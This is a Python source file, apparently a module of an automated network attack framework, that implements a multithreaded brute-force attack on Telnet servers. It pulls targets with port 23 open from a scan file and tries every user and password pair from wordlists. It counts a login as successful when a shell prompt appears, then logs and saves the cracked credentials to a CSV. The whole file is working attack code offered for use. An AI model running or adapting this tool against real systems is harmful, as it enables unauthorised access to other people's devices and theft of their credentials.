"""
telnet_connector.py - This script performs a brute-force attack on Telnet servers using a list of credentials, 
and logs the successful login attempts.
"""

import os
import telnetlib
import threading
import logging
import time
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred
from logger import Logger

# Configure the logger
logger = Logger(name="telnet_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "TelnetBruteforce"
b_module = "telnet_connector"
b_status = "brute_force_telnet"
b_port = 23
b_parent = None

class TelnetBruteforce:
    """
    Class to handle the brute-force attack process for Telnet servers.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.telnet_connector = TelnetConnector(shared_data)
        logger.info("TelnetConnector initialized.")

    def bruteforce_telnet(self, ip, port, row=None):
        """
        Perform brute-force attack on a Telnet server.
        """
        return self.telnet_connector.run_bruteforce(ip, port, row)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute-force attack.
        """
        self.shared_data.bjornorch_status = "TelnetBruteforce"
        success, results = self.bruteforce_telnet(ip, port, row)
        return 'success' if success else 'failed'

class TelnetConnector:
    """
    Class to handle Telnet connections and credential testing.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.telnetfile = shared_data.telnetfile
        # If the file does not exist, it will be created
        if not os.path.exists(self.telnetfile):
            logger.info(f"File {self.telnetfile} does not exist. Creating...")
            with open(self.telnetfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load the netkb file and filter it for Telnet ports.
        """
        self.scan = netkb_targets(self.shared_data.netkbfile, "23")

    def telnet_connect(self, adresse_ip, user, password):
        """
        Establish a Telnet connection and try to log in with the provided credentials.
        """
        try:
            tn = telnetlib.Telnet(adresse_ip)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")

            # Wait to see if the login was successful
            time.sleep(2)
            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
            tn.close()

            # Check if the login was successful
            if response[0] == 2 or response[0] == 3:
                return True
        except Exception as e:
            pass
        return False

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.telnet_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    record_cracked_cred(self.shared_data, user, password)
                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port, row=None):
        # netkb already came in as `row` from the orchestrator, which read it this cycle.
        # Re-parsing the whole file here to recover two fields we were handed cost a full
        # csv.DictReader pass per host per action. `row=None` keeps the standalone __main__
        # path (and any other caller) working by falling back to the old lookup.
        if row is not None:
            mac_address = row.get('MAC Address', '')
            hostname = row.get('Hostnames', '')
        else:
            self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
            match = next((r for r in self.scan if r.get('IPs') == adresse_ip), None)
            if match is None:
                logger.error(f"No netkb entry for {adresse_ip}; skipping.")
                return False, []
            mac_address = match['MAC Address']
            hostname = match['Hostnames']

        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
        total_tasks = len(candidates)

        for user, password in candidates:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                return False, []
            self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing Telnet...", total=total_tasks)
            
            for _ in range(self.shared_data.bruteforce_threads):  # config-driven, core-aware (shared_data.bruteforce_threads)
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break
                # Yield. With no exit signal this body does nothing, so it span a core flat
                # out for the whole attack, competing with the worker threads it waits on.
                # queue.join() below already blocks correctly; this loop exists only to
                # notice an exit signal and drain the queue.
                time.sleep(0.2)

            self.queue.join()

            for t in threads:
                t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful login attempts to a CSV file.
        """
        append_csv_rows(self.telnetfile, self.results)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results file.
        """
        dedupe_csv(self.telnetfile)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        telnet_bruteforce = TelnetBruteforce(shared_data)
        logger.info("Starting Telnet brute-force attack on port 23...")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute-force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing TelnetBruteforce on {ip}...")
            telnet_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Total number of successes: {len(telnet_bruteforce.telnet_connector.results)}")
        exit(len(telnet_bruteforce.telnet_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
